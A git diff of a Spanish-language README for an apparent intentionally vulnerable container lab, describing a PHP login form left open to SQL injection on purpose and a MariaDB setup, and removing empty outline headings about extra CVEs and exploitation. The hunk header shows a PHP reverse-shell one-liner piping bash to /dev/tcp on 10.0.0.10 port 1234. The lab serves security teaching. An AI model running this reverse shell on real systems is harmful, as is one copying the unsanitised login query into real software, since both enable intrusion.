@@ -250,38 +250,7 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?
 En primer lugar desarrollamos un formulario de inicio de sesión con su respectivo validador (en PHP). Este será el encargado de lanzar _query_ a la base de datos para verificar si las credenciales introducidas por el cliente forman parte de un usuario válido. Este código no sanitiza la entrada obtenida, es por ello que es vulnerable a un ataque de inyección SQL, como se representa en la siguiente ilustración:
 
 <p align="center">
-<img  alt="drawing" width="400" height="400" src="https://i.imgur.com/u74Zyuj.png" />
+<img  alt="drawing" width="400" height="400" src="https://i.imgur.com/u74Zyuj.png"/>
 </p>
 
 En segundo lugar instalamos MariaDB para gestionar las bases de datos que estarán conectadas al formulario. Tras crear las bases de datos con sus respectivos usuarios y verificar la conexión y el buen funcionamiento con el formulario, damos por finalizado la implementación de la vulnerabilidad principal en este contenedor.
-
-## [Vulnerabilidades CVE Extra](#índice)
-
-Para comenzar con la búsqueda de las CVEs añadidas como extra en la máquina, hay que tener en cuenta los siguientes puntos:
-- **La CVE debe ser del año 2023 o posterior**
-- **La CVE debe ser reproducible**
-- **La CVE debe tener un exploit desarrollado**
-
-CVEs elegidas para su reproducción:
-- **Software vulnerable a RCE (Remote Command Execution)**
-
-## [Desarrollo de las Vulnerabilidades Extra](#índice)
-
-## [Proceso de explotación de las vulnerabilidades](#índice)](#índice) 
-
-## [Análisis del Contenedor una vez Explotado](#índice)
-
-### [Herramientas Empleadas](#índice)
-
-# [Contenedor Numero 2 Fallas de Identificación y Autenticación](#índice)
-
-## Desarrollo de la Vulnerabilidad Principal
-
-## Desarrollo de las Vulnerabilidades Extra 
-
-## Vulnerabilidades CVE Extra 
-
-## Proceso de explotación de las vulnerabilidades 
-
-## Análisis del Contenedor una vez Explotado
-### Herramientas Empleadas
